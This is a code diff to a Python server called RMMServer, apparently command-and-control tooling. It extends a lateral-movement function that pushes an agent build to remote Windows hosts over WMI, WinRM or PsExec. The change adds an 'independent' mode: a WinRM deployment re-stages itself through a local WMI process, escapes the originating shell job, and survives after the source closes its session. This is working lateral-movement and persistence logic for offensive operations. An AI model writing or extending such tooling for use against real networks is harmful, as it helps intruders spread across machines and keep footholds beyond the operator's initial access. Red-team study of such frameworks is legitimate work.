@@ -3357,8 +3357,18 @@ class RMMServer:
 
     def lateral_move(self, session_id_or_prefix, method, host, verify=True,
                      exec_timeout=300.0, register_timeout=60.0, verify_timeout=120.0, https=False, insecure=False,
-                     loader="csharp"):
-        """Request remote execution using the source agent's compiled debug mode."""
+                     loader="csharp", independent=True):
+        """Request remote execution using the source agent's compiled debug mode.
+
+        Every method stages the workspace-owned agent build on the server.
+        wmiexec and winrm stream it through the target's Windows PowerShell
+        via the csharp loader (the powershell loader value is reserved).
+        WinRM deployments are independent by default: the receiver re-stages
+        through a local WMI process, the source closes its WinRM session
+        right after readiness, and the deployment survives the source like a
+        WMI one. independent=False (winrm only) restores the tethered
+        lifetime; other methods ignore the option.
+        """
         session = self.resolve_session(session_id_or_prefix)
         if not session:
             return None, "not_found"
@@ -3373,6 +3383,13 @@ class RMMServer:
             return None, "invalid_https"
         if not isinstance(insecure, bool) or (insecure and not https):
             return None, "invalid_insecure"
+        # Independent lifetime is a winrm-scoped option: it re-stages the
+        # deployment through a local WMI process so the target escapes the
+        # shell job and the source closes the session after readiness.
+        if not isinstance(independent, bool):
+            return None, "invalid_independent"
+        if method != "winrm":
+            independent = False
         if not isinstance(loader, str) or (loader or "").strip().lower() not in LATERAL_LOADERS:
             return None, "invalid_loader"
         if (loader or "").strip().lower() == "powershell":
@@ -3424,6 +3441,8 @@ class RMMServer:
             wire_method = method
         else:
             wire_method = ("winrm_https_insecure" if insecure else "winrm_https" if https else method) + "_loader"
+            if independent:
+                wire_method += "_independent"
         # Reserve response time for delivery and the final result instead of
         # expiring the worker and its server waiter at the same instant. Every
         # staged method now fetches its artifact before the transport runs,
@@ -3440,7 +3459,7 @@ class RMMServer:
             **({"loader": "csharp"} if method != "psexec" else {}),
             **({"payload_sha256": payload_sha256} if method != "psexec" else {}),
             **({"https": True} if https else {}), **({"insecure": True} if insecure else {})}, separators=(",", ":"))
-        self.record_operator_action(session, f"{LATERAL_COMMAND} {method} {host}" + (" -s" if https else "") + (" -k" if insecure else "") + (f" loader={loader}" if method != "psexec" else ""), "lateral")
+        self.record_operator_action(session, f"{LATERAL_COMMAND} {method} {host}" + (" -s" if https else "") + (" -k" if insecure else "") + (f" loader={loader}" if method != "psexec" else "") + (" --tethered" if method == "winrm" and not independent else ""), "lateral")
         event, status = self.exec_and_wait(session.id, command, timeout=exec_timeout)
         if status not in ("ok", "timeout"):
             return None, status
@@ -3453,6 +3472,7 @@ class RMMServer:
         payload = {"session_id": session.id, "method": method, "host": host,
                    "debug": debug,
                    **({"loader": loader} if method != "psexec" else {}),
+                   **({"independent": independent} if method == "winrm" else {}),
                    "target_session_id": target_id, "output": output,
                    "launch_status": "acknowledged" if acknowledged else "failed" if failed else "inconclusive", "submission_status": status}
         payload, verify_status = self._verify_deployment(session, target_id, payload, verify, register_timeout)
@@ -5650,6 +5670,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 exec_timeout = float(body.get("exec_timeout", 300))
                 https = body.get("https", False)
                 insecure = body.get("insecure", False)
+                independent = body.get("independent", True)
                 loader = body.get("loader", "csharp")
                 register_timeout = float(body.get("register_timeout", 60))
                 verify_timeout = float(body.get("verify_timeout", 120))
@@ -5662,6 +5683,8 @@ class RMMHandler(BaseHTTPRequestHandler):
                     raise ValueError("https must be a boolean")
                 if not isinstance(insecure, bool):
                     raise ValueError("insecure must be a boolean")
+                if not isinstance(independent, bool):
+                    raise ValueError("independent must be a boolean")
                 if not isinstance(loader, str):
                     raise ValueError("loader must be a string")
             except (TypeError, ValueError):
@@ -5676,6 +5699,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 register_timeout=register_timeout,
                 verify_timeout=verify_timeout,
                 loader=loader,
+                independent=independent,
                 **({"https": True} if https else {}),
                 **({"insecure": True} if insecure else {}),
             )
@@ -5684,7 +5708,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             elif status in ("agent_type_unsupported", "session_busy"):
                 self._json(409, {"error": status})
             elif status in ("invalid_method", "invalid_host", "invalid_https",
-                            "invalid_insecure", "invalid_loader"):
+                            "invalid_insecure", "invalid_loader", "invalid_independent"):
                 self._json(400, {"error": status})
             elif status == "loader_reserved":
                 self._json(400, {"error": status,
